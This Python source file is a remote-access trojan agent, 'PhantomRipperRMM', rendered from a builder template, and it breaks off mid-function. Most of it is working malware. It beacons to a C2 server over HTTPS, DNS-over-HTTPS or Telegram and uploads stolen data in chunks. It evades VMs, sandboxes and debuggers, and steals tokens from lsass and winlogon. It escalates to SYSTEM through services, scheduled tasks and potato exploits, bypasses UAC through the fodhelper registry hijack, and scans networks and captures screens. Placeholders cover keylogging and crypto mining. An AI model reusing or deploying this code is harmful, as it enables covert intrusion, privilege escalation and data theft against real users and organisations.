#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PhantomRipperRMM — cross-platform agent (rendered from template).

The panel builder substitutes TOKEN placeholders and strips optional
feature blocks (marked with builder pragma comments) unless they were
enabled at build time.

Protocol:
  HTTP/HTTPS/DoH : POST {C2}{PATH_PREFIX}/beacon  -> {command, task?}
                   POST {C2}{PATH_PREFIX}/response
                   POST {C2}{PATH_PREFIX}/artifact (chunked)
  WS             : /ws/agent?id=<session>  (JSON text + binary frames)
  Telegram       : long-poll getUpdates (transport=telegram)

Launch modes:
  (default)        main agent
  --system-child   spawned as SYSTEM by getsys persistence tiers
  --session-worker spawned into the interactive desktop from session 0
  --elevated       spawned by a UAC bypass (high integrity)
"""

import base64
import io
import json
import os
import platform
import random
import re
import socket
import struct
import subprocess
import sys
import threading
import time
import uuid
import zlib

# ---------------------------------------------------------------------------
# Injected configuration
# ---------------------------------------------------------------------------
C2_HOST = "{{C2_HOST}}"
C2_PORT = {{C2_PORT}}
C2_SCHEME = "{{C2_SCHEME}}"
PATH_PREFIX = "{{PATH_PREFIX}}"
TRANSPORT = "{{TRANSPORT}}"
BEACON_INTERVAL = {{BEACON_INTERVAL}}
JITTER = {{JITTER}}
SESSION_ID = "{{SESSION_ID}}"
ENABLE_PERSIST = {{PERSIST}}
ENABLE_KEYLOG = {{KEYLOG}}
ENABLE_MINER = {{MINER}}
MINER_POOL = "{{MINER_POOL}}"
MINER_WALLET = "{{MINER_WALLET}}"
ANTI_VM = {{ANTI_VM}}
ANTI_DEBUG = {{ANTI_DEBUG}}
USER_AGENT = "{{USER_AGENT}}"
HEADER_CARRY = {{HEADER_CARRY}}
DECOYS = "{{DECOYS}}"
KILLDATE = "{{KILLDATE}}"
PROC_NAME = "{{PROC_NAME}}"
TG_BOT_TOKEN = "{{TG_BOT_TOKEN}}"
TG_CHAT = "{{TG_CHAT}}"
ARTIFACT_CHUNK = {{ARTIFACT_CHUNK}}
AUTO_ELEVATE = {{AUTO_ELEVATE}}

BASE_URL = "{scheme}://{host}:{port}".format(scheme=C2_SCHEME, host=C2_HOST, port=C2_PORT)

IS_WIN = os.name == "nt"
IS_MAC = sys.platform == "darwin"
LAUNCH_MODE = "main"
for _a in sys.argv[1:]:
    if _a == "--system-child":
        LAUNCH_MODE = "system"; SESSION_ID = SESSION_ID + "sys"
    elif _a == "--session-worker":
        LAUNCH_MODE = "worker"; SESSION_ID = SESSION_ID + "ui"
    elif _a == "--elevated":
        LAUNCH_MODE = "elevated"; SESSION_ID = SESSION_ID + "adm"

if IS_WIN:
    import ctypes
    from ctypes import wintypes, byref, c_void_p, c_int, c_uint, c_ubyte, POINTER, WINFUNCTYPE, Union, Structure, sizeof, c_char_p, c_wchar_p
    advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
    kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    gdi32 = ctypes.WinDLL("gdi32", use_last_error=True)
    crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)
    wtsapi32 = ctypes.WinDLL("wtsapi32", use_last_error=True)
    psapi = ctypes.WinDLL("psapi", use_last_error=True)
    HANDLE = wintypes.HANDLE
    INVALID_HANDLE_VALUE = HANDLE(-1)
    CREATE_NO_WINDOW = 0x08000000
    GENERIC_ALL = 0x10000000

# ---------------------------------------------------------------------------
# tiny helpers
# ---------------------------------------------------------------------------
def _sleep(base=None):
    b = base if base else BEACON_INTERVAL
    time.sleep(max(1.0, b * (1.0 + random.uniform(-JITTER, JITTER))))


def _b64(data):
    return base64.b64encode(data).decode()


def _ub64(data):
    return base64.urlsafe_b64encode(data).decode().rstrip("=")


def _ub64dec(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def agent_dir():
    try:
        if getattr(sys, "frozen", False):
            return os.path.dirname(os.path.abspath(sys.executable))
        return os.path.dirname(os.path.abspath(__file__))
    except Exception:
        return os.getcwd()


def _tempfile(suffix=""):
    return os.path.join(agent_dir(), ".%s%s" % (uuid.uuid4().hex[:10], suffix))


def _killswitch():
    if KILLDATE and re.match(r"^\d{4}-\d{2}-\d{2}$", KILLDATE):
        try:
            if time.strftime("%Y-%m-%d") > KILLDATE:
                return True
        except Exception:
            pass
    return False


MODULES_ENABLED = set([m for m in "{{MODULES_ENABLED}}".split(",") if m])


# ---------------------------------------------------------------------------
# HTTP transport (https / doh) — stdlib only
# ---------------------------------------------------------------------------
_last_resp_headers = {}


def _http(method, path, payload=None, timeout=30, extra_headers=None):
    global _last_resp_headers
    import urllib.request
    import ssl
    url = BASE_URL + path
    data = json.dumps(payload).encode("utf-8") if payload is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    req.add_header("User-Agent", USER_AGENT)
    for k, v in (extra_headers or {}).items():
        req.add_header(k, v)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            raw = resp.read().decode("utf-8", "ignore")
            _last_resp_headers = {k.lower(): v for k, v in resp.headers.items()}
            return json.loads(raw) if raw.strip().startswith("{") else {"raw": raw}
    except Exception:
        return None


def _doh_roundtrip(payload):
    import urllib.request
    import ssl
    blob = _ub64(json.dumps(payload).encode())
    url = "https://{host}/dns-query?name={blob}.{sid}&type=TXT".format(
        host=C2_HOST, blob=blob[:180], sid=SESSION_ID)
    req = urllib.request.Request(url, method="GET")
    req.add_header("User-Agent", USER_AGENT)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(req, timeout=25, context=ctx) as resp:
            return json.loads(resp.read().decode("utf-8", "ignore"))
    except Exception:
        return None


def post_beacon(info):
    payload = {"session_id": SESSION_ID, "info": info}
    if TRANSPORT == "doh":
        return _doh_roundtrip(payload)
    return _http("POST", PATH_PREFIX + "/beacon", payload)


def post_response(command, output, task_id=None, error=False):
    payload = {"session_id": SESSION_ID, "command": command, "output": output,
               "encoding": "base64"}
    if task_id:
        payload["task_id"] = task_id
    if error:
        payload["error"] = True
    payload["output"] = _b64(output.encode("utf-8", "ignore") if isinstance(output, str) else output)
    if TRANSPORT == "doh":
        return _doh_roundtrip(payload)
    return _http("POST", PATH_PREFIX + "/response", payload, timeout=60)


def post_artifact(name, data, kind="file", task_id=None):
    total = max(1, (len(data) + ARTIFACT_CHUNK - 1) // ARTIFACT_CHUNK)
    for seq in range(total):
        chunk = data[seq * ARTIFACT_CHUNK:(seq + 1) * ARTIFACT_CHUNK]
        payload = {
            "session_id": SESSION_ID, "task_id": task_id, "kind": kind,
            "name": name, "seq": seq, "total": total, "data": _b64(chunk),
        }
        r = _doh_roundtrip(payload) if TRANSPORT == "doh" else _http("POST", PATH_PREFIX + "/artifact", payload, timeout=90)
        if not r or r.get("status") not in ("ok", "partial"):
            return False
    return True


def _decoy():
    if not DECOYS:
        return
    if random.random() < 0.12:
        try:
            import urllib.request
            import ssl
            url = random.choice([d for d in DECOYS.split(",") if d.strip()])
            req = urllib.request.Request(url.strip(), method="GET")
            req.add_header("User-Agent", USER_AGENT)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            urllib.request.urlopen(req, timeout=6, context=ctx).read(4096)
        except Exception:
            pass


# ---------------------------------------------------------------------------
# fingerprint
# ---------------------------------------------------------------------------
def _username():
    for key in ("USERNAME", "USER", "LOGNAME"):
        if os.environ.get(key):
            return os.environ[key]
    try:
        import getpass
        return getpass.getuser()
    except Exception:
        return "unknown"


def _privilege():
    if not IS_WIN:
        try:
            return "root" if os.geteuid() == 0 else "user"
        except Exception:
            return "user"
    try:
        if _sid_string() == "S-1-5-18":
            return "system"
        return "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user"
    except Exception:
        return "user"


def sysinfo():
    return {
        "hostname": socket.gethostname(),
        "username": _username(),
        "os": platform.system(),
        "arch": platform.machine(),
        "pid": os.getpid(),
        "privilege": _privilege(),
        "agent_type": "python",
        "mode": LAUNCH_MODE,
        "proto": "task",
        "hdr": HEADER_CARRY,
        "caps": caps_list(),
    }


def caps_list():
    caps = ["shell", "info", "artifact", "screen", "file", "proc"]
    mods = MODULES_ENABLED
    for m in ("esc", "uac", "runas", "hvnc", "keylog", "creds", "persist", "exec", "inject", "pymod", "lateral", "net", "proc", "overlay"):
        if m in mods:
            caps.append(m)
    return caps


# ---------------------------------------------------------------------------
# anti-analysis (core gate + expanded module)
# ---------------------------------------------------------------------------
def _vm_hits():
    hits = 0
    try:
        if IS_WIN:
            out = subprocess.run(["wmic", "computersystem", "get", "manufacturer,model"],
                                 capture_output=True, text=True, timeout=10,
                                 creationflags=CREATE_NO_WINDOW).stdout.lower()
            for marker in ("vmware", "virtualbox", "qemu", "xen", "hyper-v", "vbox"):
                if marker in out:
                    hits += 1
        else:
            for path in ("/sys/class/dmi/id/product_name", "/sys/class/dmi/id/sys_vendor"):
                if os.path.exists(path):
                    txt = open(path).read().lower()
                    for marker in ("vmware", "virtualbox", "qemu", "xen", "kvm"):
                        if marker in txt:
                            hits += 1
    except Exception:
        pass
    return hits


def anti_analysis_gate():
    if ANTI_VM and _vm_hits() >= 2:
        return True
    if ANTI_DEBUG and sys.gettrace() is not None:
        return True
    return False


//#pragma module anti
_ADV_TOOLS = ("wireshark", "procmon", "procexp", "x64dbg", "x32dbg", "ollydbg",
              "process hacker", "processhacker", "pestudio", "fiddler", "idaq",
              "dnspy", "cheatengine", "httpdebugger", "regmon", "filemon")
_SANDBOX_USERS = ("user", "sandbox", "malware", "virus", "sample", "analysis", "test", "john", "vm")

if IS_WIN:
    class _MS_PERF(Structure):
        _fields_ = [("Frequency", ctypes.c_longlong), ("Count", ctypes.c_longlong)]


def _anti_deep():
    if not IS_WIN:
        return False
    try:
        # tiny RAM / cores / uptime heuristics
        class MEMORYSTATUSEX(Structure):
            _fields_ = [("dwLength", wintypes.DWORD), ("dwMemoryLoad", wintypes.DWORD),
                        ("ullTotalPhys", ctypes.c_ulonglong), ("ullAvailPhys", ctypes.c_ulonglong),
                        ("ullTotalPageFile", ctypes.c_ulonglong), ("ullAvailPageFile", ctypes.c_ulonglong),
                        ("ullTotalVirtual", ctypes.c_ulonglong), ("ullAvailVirtual", ctypes.c_ulonglong),
                        ("ullAvailExtendedVirtual", ctypes.c_ulonglong)]
        m = MEMORYSTATUSEX(); m.dwLength = sizeof(MEMORYSTATUSEX)
        kernel32.GlobalMemoryStatusEx(byref(m))
        if m.ullTotalPhys < (2 << 30):
            return True
        if os.cpu_count() and os.cpu_count() < 2:
            return True
        # uptime
        up = kernel32.GetTickCount64() / 1000.0
        if up < 600:
            return True
        # usernames
        u = (_username() or "").lower()
        if u in _SANDBOX_USERS:
            return True
        # analysis processes
        names = _ps_list_names()
        joined = " ".join(names).lower()
        for t in _ADV_TOOLS:
            if t in joined:
                return True
        # mouse moves?
        pt = wintypes.POINT()
        user32.GetCursorPos(byref(pt))
        x0, y0 = pt.x, pt.y
        time.sleep(1.2)
        user32.GetCursorPos(byref(pt))
        if (pt.x, pt.y) == (x0, y0):
            return True
    except Exception:
        pass
    return False
//#pragma endmodule


# ---------------------------------------------------------------------------
# process snapshot (core — shared by anti-analysis and proc module)
# ---------------------------------------------------------------------------
if IS_WIN:
    class _PROCESSENTRY32W(Structure):
        _fields_ = [("dwSize", wintypes.DWORD), ("cntUsage", wintypes.DWORD),
                    ("th32ProcessID", wintypes.DWORD),
                    ("th32DefaultHeapID", ctypes.POINTER(wintypes.ULONG)),
                    ("th32ModuleID", wintypes.DWORD), ("cntThreads", wintypes.DWORD),
                    ("th32ParentProcessID", wintypes.DWORD), ("pcPriClassBase", ctypes.c_long),
                    ("dwFlags", wintypes.DWORD), ("szExeFile", wintypes.WCHAR * 260)]

    TH32CS_SNAPPROCESS = 0x2


def _ps_list_names():
    out = []
    if not IS_WIN:
        try:
            for p in os.listdir("/proc"):
                if p.isdigit():
                    try:
                        out.append(open("/proc/%s/comm" % p).read().strip())
                    except Exception:
                        pass
        except Exception:
            pass
        return out
    try:
        snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        e = _PROCESSENTRY32W(); e.dwSize = sizeof(_PROCESSENTRY32W)
        ok = kernel32.Process32FirstW(snap, byref(e))
        while ok:
            out.append(e.szExeFile)
            ok = kernel32.Process32NextW(snap, byref(e))
        kernel32.CloseHandle(snap)
    except Exception:
        pass
    return out


# ---------------------------------------------------------------------------
# PNG encoder (stdlib zlib) — RGB8
# ---------------------------------------------------------------------------
def _png_encode(rgb, w, h):
    def _chunk(t, d):
        c = t + d
        return struct.pack(">I", len(d)) + c + struct.pack(">I", zlib.crc32(c) & 0xFFFFFFFF)
    ihdr = struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0)
    stride = w * 3
    scan = bytearray()
    for y in range(h):
        scan.append(0)
        scan += rgb[y * stride:(y + 1) * stride]
    return (b"\x89PNG\r\n\x1a\n" + _chunk(b"IHDR", ihdr)
            + _chunk(b"IDAT", zlib.compress(bytes(scan), 6)) + _chunk(b"IEND", b""))


# ---------------------------------------------------------------------------
# shell / process helpers
# ---------------------------------------------------------------------------
def _run(cmd, timeout=120, shell=True):
    try:
        kw = dict(shell=shell, capture_output=True, text=True, timeout=timeout)
        if IS_WIN:
            kw["creationflags"] = CREATE_NO_WINDOW
        proc = subprocess.run(cmd, **kw)
        out = proc.stdout or ""
        if proc.stderr:
            out += "\n[stderr]\n" + proc.stderr
        if not out.strip():
            out = "[no output, exit=%s]" % proc.returncode
        return out
    except subprocess.TimeoutExpired:
        return "ERROR: command timed out"
    except Exception as exc:
        return "ERROR: %s" % exc


//#pragma module proc
def task_ps(args):
    if not IS_WIN:
        return _run("ps aux")
    names = _ps_list_names_pids()
    return "\n".join("%-8s %s" % (pid, name) for pid, name in names)


def _ps_list_names_pids():
    out = []
    try:
        snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        e = _PROCESSENTRY32W(); e.dwSize = sizeof(_PROCESSENTRY32W)
        ok = kernel32.Process32FirstW(snap, byref(e))
        while ok:
            out.append((e.th32ProcessID, e.szExeFile))
            ok = kernel32.Process32NextW(snap, byref(e))
        kernel32.CloseHandle(snap)
    except Exception:
        pass
    return out


def task_kill(args):
    try:
        pid = int(args.strip())
        k = kernel32.OpenProcess(0x0001, False, pid)  # PROCESS_TERMINATE
        if not k:
            return "ERROR: OpenProcess failed (%s)" % ctypes.get_last_error()
        ok = kernel32.TerminateProcess(k, 1)
        kernel32.CloseHandle(k)
        return "killed %s" % pid if ok else "ERROR: TerminateProcess failed"
    except Exception as exc:
        return "ERROR: %s" % exc


//#pragma endmodule

//#pragma module net
def task_netrecon(args):
    cmds = ["ipconfig /all", "arp -a", "route print", "netstat -ano", "whoami /all"]
    out = []
    for c in cmds:
        out.append("=== %s ===\n%s" % (c, _run(c)))
    return "\n\n".join(out)


def task_portscan(args):
    """portscan 192.168.1.1,192.168.1.0/24 22,80,443,3389"""
    import ipaddress
    parts = args.split()
    if len(parts) < 2:
        return "usage: portscan <hosts|cidr,...> <ports>"
    hosts = []
    for h in parts[0].split(","):
        h = h.strip()
        if "/" in h:
            try:
                hosts += [str(x) for x in ipaddress.ip_network(h, strict=False).hosts()]
            except Exception:
                pass
        else:
            hosts.append(h)
    ports = [int(p) for p in parts[1].split(",") if p.strip().isdigit()]
    open_ = []

    def probe(h, p):
        s = socket.socket()
        s.settimeout(1.2)
        try:
            s.connect((h, p))
            open_.append("%s:%d" % (h, p))
        except Exception:
            pass
        finally:
            s.close()

    threads = []
    for h in hosts[:256]:
        for p in ports[:32]:
            t = threading.Thread(target=probe, args=(h, p), daemon=True)
            t.start(); threads.append(t)
    for t in threads:
        t.join(3)
    return "open: %s" % (", ".join(open_) or "none")


//#pragma endmodule

//#pragma module esc  (privilege escalation + token vault)
if IS_WIN:
    class _LUID(Structure):
        _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]

    class _LUIDA(Structure):
        _fields_ = [("Luid", _LUID), ("Attributes", wintypes.DWORD)]

    class _TOKEN_PRIVS(Structure):
        _fields_ = [("PrivilegeCount", wintypes.DWORD), ("Privileges", _LUIDA * 1)]

    class _STARTUPINFOW(Structure):
        _fields_ = [("cb", wintypes.DWORD), ("lpReserved", wintypes.LPWSTR),
                    ("lpDesktop", wintypes.LPWSTR), ("lpTitle", wintypes.LPWSTR),
                    ("dwX", wintypes.DWORD), ("dwY", wintypes.DWORD),
                    ("dwXSize", wintypes.DWORD), ("dwYSize", wintypes.DWORD),
                    ("dwXCountChars", wintypes.DWORD), ("dwYCountChars", wintypes.DWORD),
                    ("dwFillAttribute", wintypes.DWORD), ("dwFlags", wintypes.DWORD),
                    ("wShowWindow", wintypes.WORD), ("cbReserved2", wintypes.WORD),
                    ("lpReserved2", c_void_p), ("hStdInput", HANDLE),
                    ("hStdOutput", HANDLE), ("hStdError", HANDLE)]

    class _PROCESS_INFO(Structure):
        _fields_ = [("hProcess", HANDLE), ("hThread", HANDLE),
                    ("dwProcessId", wintypes.DWORD), ("dwThreadId", wintypes.DWORD)]

    TOKEN_ALL = 0xF00FF
    TOKEN_DUPLICATE = 0x0002
    TOKEN_QUERY = 0x0008
    TOKEN_ASSIGN_PRIMARY = 0x0001
    SecurityImpersonation = 2
    TokenPrimary = 1
    SE_DEBUG = "SeDebugPrivilege"
    PROCESS_QI = 0x0400

_TOKEN_VAULT = {"default": None}


if IS_WIN:
    def _enable_priv(name):
        h = HANDLE()
        if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), 0x0028, byref(h)):
            return False
        luid = _LUID()
        if not advapi32.LookupPrivilegeValueW(None, name, byref(luid)):
            return False
        tp = _TOKEN_PRIVS()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = 2  # SE_PRIVILEGE_ENABLED
        ok = advapi32.AdjustTokenPrivileges(h, False, byref(tp), 0, None, None)
        kernel32.CloseHandle(h)
        return bool(ok) and ctypes.get_last_error() == 0

    def _sid_string():
        advapi32.GetTokenInformation.argtypes = [HANDLE, c_int, c_void_p, wintypes.DWORD, POINTER(wintypes.DWORD)]
        h = HANDLE()
        if not advapi32.OpenProcessToken(kernel32.GetCurrentProcess(), TOKEN_QUERY, byref(h)):
            return "?"
        n = wintypes.DWORD(0)
        advapi32.GetTokenInformation(h, 1, None, 0, byref(n))  # TokenUser
        if n.value == 0:
            return "?"
        buf = ctypes.create_string_buffer(n.value)
        if not advapi32.GetTokenInformation(h, 1, buf, n.value, byref(n)):
            return "?"
        sid = ctypes.cast(buf, POINTER(c_void_p)).contents
        s = wintypes.LPWSTR()
        advapi32.ConvertSidToStringSidW(sid.value, byref(s))
        return s.value or "?"

    def _is_system():
        try:
            return _sid_string() == "S-1-5-18"
        except Exception:
            return False

    def steal_token(pid):
        _enable_priv(SE_DEBUG)
        hproc = kernel32.OpenProcess(PROCESS_QI, False, int(pid))
        if not hproc:
            return "ERROR: OpenProcess(%s) failed" % pid
        htok = HANDLE()
        if not advapi32.OpenProcessToken(hproc, TOKEN_DUPLICATE | TOKEN_QUERY, byref(htok)):
            kernel32.CloseHandle(hproc)
            return "ERROR: OpenProcessToken failed"
        hdup = HANDLE()
        if not advapi32.DuplicateTokenEx(htok, TOKEN_ALL, None, SecurityImpersonation, TokenPrimary, byref(hdup)):
            return "ERROR: DuplicateTokenEx failed"
        _TOKEN_VAULT["default"] = hdup
        kernel32.CloseHandle(htok)
        kernel32.CloseHandle(hproc)
        return "token from pid %s vaulted" % pid

    def _create_with_token(tok, cmdline, desktop=None):
        si = _STARTUPINFOW()
        si.cb = sizeof(_STARTUPINFOW)
        if desktop:
            si.lpDesktop = desktop
        pi = _PROCESS_INFO()
        ok = advapi32.CreateProcessWithTokenW(tok, 0x1, None, cmdline, CREATE_NO_WINDOW, None, None, byref(si), byref(pi))
        if ok:
            kernel32.CloseHandle(pi.hProcess)
            kernel32.CloseHandle(pi.hThread)
        return ok

    def _find_pids(name):
        return [pid for pid, exe in _ps_list_names_pids() if exe.lower() == name.lower()]
//#pragma endmodule


//#pragma module uac
def task_uac(args):
    """uac [command] — fodhelper auto-elevate of a command (or this agent)."""
    if not IS_WIN:
        return "uac: windows only"
    if ctypes.windll.shell32.IsUserAnAdmin():
        return "already elevated"
    target = args.strip()
    if not target:
        exe = sys.executable if getattr(sys, "frozen", False) else sys.executable
        py = "" if getattr(sys, "frozen", False) else '"%s" ' % sys.executable
        me = os.path.abspath(sys.argv[0])
        target = '%s"%s" --elevated' % (py, me)
    key = r"Software\Classes\ms-settings\Shell\Open\command"
    try:
        import winreg
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, None, 0, winreg.REG_SZ, target)
        winreg.SetValueEx(k, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.CloseKey(k)
        subprocess.Popen("fodhelper.exe", shell=True, creationflags=CREATE_NO_WINDOW)
        time.sleep(3)
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(k, "DelegateExecute")
        winreg.DeleteValue(k, None)
        winreg.CloseKey(k)
        return "uac: fodhelper fired — elevated child should beacon as %s" % (SESSION_ID + "adm")
    except Exception as exc:
        return "ERROR: %s" % exc
//#pragma endmodule


//#pragma module esc  (getsys + runas continue)
def task_getsys(args):
    """Tiered SYSTEM: token theft -> service -> schtasks -> potato exe."""
    if not IS_WIN:
        return _run("sudo -n true 2>&1 || echo 'no sudo'")
    if _is_system():
        return "already SYSTEM"
    mode = args.strip().lower() or "auto"

    def tier_theft():
        _enable_priv(SE_DEBUG)
        for n in ("winlogon.exe", "lsass.exe", "services.exe"):
            for pid in _find_pids(n):
                r = steal_token(pid)
                if r.startswith("token"):
                    tok = _TOKEN_VAULT["default"]
                    exe = sys.executable if getattr(sys, "frozen", False) else sys.executable
                    py = "" if getattr(sys, "frozen", False) else '"%s" ' % sys.executable
                    me = os.path.abspath(sys.argv[0])
                    if _create_with_token(tok, '%s"%s" --system-child' % (py, me)):
                        return "SYSTEM via %s token theft — child session %ssys" % (n, SESSION_ID)
        return None

    def tier_service():
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return None
        exe = sys.executable if getattr(sys, "frozen", False) else sys.executable
        py = "" if getattr(sys, "frozen", False) else '"%s" ' % sys.executable
        me = os.path.abspath(sys.argv[0])
        binp = '%s"%s" --system-child' % (py, me)
        sname = "PhantomSvc" + uuid.uuid4().hex[:6]
        r = _run('sc create %s binPath= "%s" start= demand' % (sname, binp))
        if "FAILED" in r.upper():
            return None
        _run("sc start %s" % sname)
        _run("sc delete %s" % sname)
        return "SYSTEM via service spawn — child session %ssys" % SESSION_ID

    def tier_schtasks():
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return None
        exe = sys.executable if getattr(sys, "frozen", False) else sys.executable
        py = "" if getattr(sys, "frozen", False) else '"%s" ' % sys.executable
        me = os.path.abspath(sys.argv[0])
        tname = "PhantomTask" + uuid.uuid4().hex[:6]
        r = _run('schtasks /create /tn %s /ru SYSTEM /sc once /st 00:00 /tr "%s%s --system-child"'
                 % (tname, py, me))
        _run("schtasks /run /tn %s" % tname)
        time.sleep(2)
        _run("schtasks /delete /tn %s /f" % tname)
        return "SYSTEM via schtasks — child session %ssys" % SESSION_ID

    def tier_potato():
        for p in ("godpotato.exe", "sweetpotato.exe", "printspoofer.exe"):
            full = os.path.join(agent_dir(), p)
            if os.path.exists(full):
                exe = sys.executable if getattr(sys, "frozen", False) else sys.executable
                py = "" if getattr(sys, "frozen", False) else '"%s" ' % sys.executable
                me = os.path.abspath(sys.argv[0])
                if p.startswith("god"):
                    cmd = '"%s" -cmd "%s%s --system-child"' % (full, py, me)
                elif p.startswith("sweet"):
                    cmd = '"%s" -p "%s%s --system-child"' % (full, py, me)
                else:
                    cmd = '"%s" 1 "%s%s --system-child"' % (full, py, me)
                subprocess.Popen(cmd, shell=True, creationflags=CREATE_NO_WINDOW)
                return "potato fired (%s) — watch for child session %ssys" % (p, SESSION_ID)
        return None

    tiers = [tier_theft, tier_service, tier_schtasks, tier_potato]
    if mode != "auto":
        m = {"theft": 0, "service": 1, "schtasks": 2, "potato": 3}
        tiers = [tiers[m[mode]]] if mode in m else tiers
    results = []
    for t in tiers:
        try:
            r = t()
        except Exception as exc:
            r = None
            results.append("%s: EXC %s" % (t.__name__, exc))
        if r:
            return r
    return "getsys exhausted: %s" % ("; ".join(results) or "all tiers failed")


def task_runas(args):
    """runas [system|<pid>] <command...>"""
    if not IS_WIN:
        return "runas: windows only"
    parts = args.strip().split(None, 1)
    if len(parts) < 2:
        return "usage: runas system|<pid> <command>"
    ctx, cmd = parts
    _enable_priv(SE_DEBUG)
    if ctx == "system":
        tok = _TOKEN_VAULT.get("default")
        if not tok:
            for n in ("winlogon.exe", "lsass.exe"):
                for pid in _find_pids(n):
                    steal_token(pid)
                    break
                if _TOKEN_VAULT.get("default"):
                    break
        tok = _TOKEN_VAULT.get("default")
        if not tok:
            return "no SYSTEM token in vault — run getsys first"
        out = _tempfile(".out")
        full = 'cmd.exe /c %s > "%s" 2>&1' % (cmd, out)
        if not _create_with_token(tok, full):
            return "ERROR: CreateProcessWithTokenW failed (%s)" % ctypes.get_last_error()
        time.sleep(2)
        try:
            data = open(out, "r", errors="ignore").read()
            os.remove(out)
            return data or "(no output)"
        except Exception:
            return "(output pending — check again)"
    try:
        pid = int(ctx)
        steal_token(pid)
        tok = _TOKEN_VAULT["default"]
        if not tok:
            return "ERROR: steal from %s failed" % pid
        out = _tempfile(".out")
        if not _create_with_token(tok, 'cmd.exe /c %s > "%s" 2>&1' % (cmd, out)):
            return "ERROR: CreateProcessWithTokenW failed"
        time.sleep(2)
        data = open(out, "r", errors="ignore").read()
        os.remove(out)
        return data or "(no output)"
    except ValueError:
        return "usage: runas system|<pid> <command>"


def task_steal(args):
    return steal_token(args.strip()) if args.strip() else "usage: steal <pid>"
//#pragma endmodule


//#pragma module runas  (session worker — needs esc structures)
def task_worker(args):
    """Spawn a copy of this agent into the active user desktop (from SYSTEM)."""
    if not IS_WIN:
        return "worker: windows only"
    _enable_priv(SE_DEBUG)
    sid = kernel32.WTSGetActiveConsoleSessionId()
    htok = HANDLE()
    if not wtsapi32.WTSQueryUserToken(sid, byref(htok)):
        return "ERROR: WTSQueryUserToken(%s) failed (%s)" % (sid, ctypes.get_last_error())
    hdup = HANDLE()
    if not advapi32.DuplicateTokenEx(htok, TOKEN_ALL, None, SecurityImpersonation, TokenPrimary, byref(hdup)):
        return "ERROR: DuplicateTokenEx failed"
    exe = sys.executable if getattr(sys, "frozen", False) else sys.executable
    py = "" if getattr(sys, "frozen", False) else '"%s" ' % sys.executable
    me = os.path.abspath(sys.argv[0])
    si = _STARTUPINFOW()
    si.cb = sizeof(_STARTUPINFOW)
    si.lpDesktop = "winsta0\\default"
    pi = _PROCESS_INFO()
    cmd = ctypes.create_unicode_buffer('%s"%s" --session-worker' % (py, me))
    advapi32.CreateProcessAsUserW.argtypes = [HANDLE, wintypes.LPCWSTR, wintypes.LPWSTR, c_void_p, c_void_p, wintypes.BOOL, wintypes.DWORD, c_void_p, c_void_p, c_void_p, POINTER(_PROCESS_INFO)]
    if not advapi32.CreateProcessAsUserW(hdup, None, cmd, None, None, False, CREATE_NO_WINDOW, None, None, byref(si), byref(pi)):
        return "ERROR: CreateProcessAsUserW failed (%s)" % ctypes.get_last_error()
    return "session worker launched in user desktop — session %sui" % SESSION_ID
//#pragma endmodule


//#pragma module screen
def _capture_rect(x, y, w, h):
    user32.SetProcessDPIAware()
    hdc = user32.GetDC(0)
    memdc = gdi32.CreateCompatibleDC(hdc)
    bmp = gdi32.CreateCompatibleBitmap(hdc, w, h)
    gdi32.SelectObject(memdc, bmp)
    gdi32.BitBlt(memdc, 0, 0, w, h, hdc, x, y, 0x00CC0020)

    class BMIH(Structure):
        _fields_ = [("biSize", wintypes.DWORD), ("biWidth", ctypes.c_long), ("biHeight", ctypes.c_long),
                    ("biPlanes", wintypes.WORD), ("biBitCount", wintypes.WORD), ("biCompression", wintypes.DWORD),
                    ("biSizeImage", wintypes.DWORD), ("biXPelsPerMeter", ctypes.c_long),
                    ("biYPelsPerMeter", ctypes.c_long), ("biClrUsed", wintypes.DWORD), ("biClrImportant", wintypes.DWORD)]

    bih = BMIH()
    bih.biSize = sizeof(BMIH)
    bih.biWidth = w
    bih.biHeight = -h
    bih.biPlanes = 1
    bih.biBitCount = 32
    bufsize = w * h * 4
    buf = ctypes.create_string_buffer(bufsize)
    gdi32.GetDIBits(memdc, bmp, 0, h, buf, byref(bih), 0)
    gdi32.DeleteObject(bmp)
    gdi32.DeleteDC(memdc)
    user32.ReleaseDC(0, hdc)
    return buf.raw


def task_screen(args):
    """screen [x y w h] — BMP capture (fast); full virtual screen by default."""
    if not IS_WIN:
        try:
            for tool, cmd in (("gnome-screenshot", ["gnome-screenshot", "-f", "/tmp/.pr.png"]),
                              ("scrot", ["scrot", "/tmp/.pr.png"]),
                              ("screencapture", ["screencapture", "-x", "/tmp/.pr.png"])):
                if subprocess.run(["which", tool], capture_output=True).returncode == 0:
                    subprocess.run(cmd, capture_output=True, timeout=30)
                    data = open("/tmp/.pr.png", "rb").read()
                    os.remove("/tmp/.pr.png")
                    post_artifact("screen.png", data, "screen")
                    return "screen: posix png sent (%d B)" % len(data)
            return "screen: no capture tool"
        except Exception as exc:
            return "screen: %s" % exc
    p = args.split()
